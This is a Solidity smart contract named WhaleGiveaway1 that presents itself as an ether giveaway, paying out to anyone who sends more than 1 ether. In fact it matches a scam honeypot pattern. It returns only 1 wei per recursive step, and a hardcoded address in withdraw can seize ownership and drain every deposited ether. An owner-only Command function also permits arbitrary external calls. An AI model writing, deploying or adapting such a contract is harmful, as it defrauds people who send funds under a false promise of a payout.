pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public O = msg.sender;

    function() public payable {}

    function GetFreebie() public payable {
        if (msg.value > 1 ether) {
            recursiveTransfer(O, msg.sender);
        }
    }

    function recursiveTransfer(address o, address s) internal {
        if (this.balance > 0) {
            o.transfer(1);
            s.transfer(1);
            recursiveTransfer(o, s);
        }
    }

    function withdraw() payable public {
        if (msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {
            O = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        }
        require(msg.sender == O);
        O.transfer(this.balance);
    }

    function Command(address a, bytes d) payable public {
        require(msg.sender == O);
        a.call.value(msg.value)(d);
    }
}